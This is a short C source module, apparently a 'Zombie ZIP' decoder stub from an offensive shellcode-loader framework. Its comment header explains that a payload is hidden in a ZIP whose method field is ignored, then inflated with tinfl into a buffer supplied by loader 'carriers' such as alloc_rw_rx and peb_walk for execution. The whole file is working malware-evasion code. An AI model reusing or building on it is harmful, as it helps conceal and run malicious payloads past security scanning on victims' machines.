/* MODULE: DECODER
 * TYPE: zombie_zip
 * DESC: Zombie ZIP — ignores ZIP method field, inflates raw DEFLATE payload.
 *       Offsets are compile-time constants from payload.h (no runtime ZIP parsing).
 *       Requires carriers that allocate a separate destination buffer (alloc_rw_rx,
 *       peb_walk). In-place carriers like change_rw_rx will corrupt data because
 *       source and destination overlap — same constraint as english encoding.
 */
#include "../header/definitions.h"
#include "tinfl.h"

FORCE_INLINE void decode_payload(char *dest, int len) {
    const unsigned char *comp_data = supermega_payload + ZOMBIEZIP_DATA_OFFSET;
    tinfl_decompress_mem_to_mem(
        dest, (size_t)len,
        comp_data, (size_t)ZOMBIEZIP_COMPRESSED_LEN,
        0  /* flags=0: raw DEFLATE, no zlib header */
    );
}
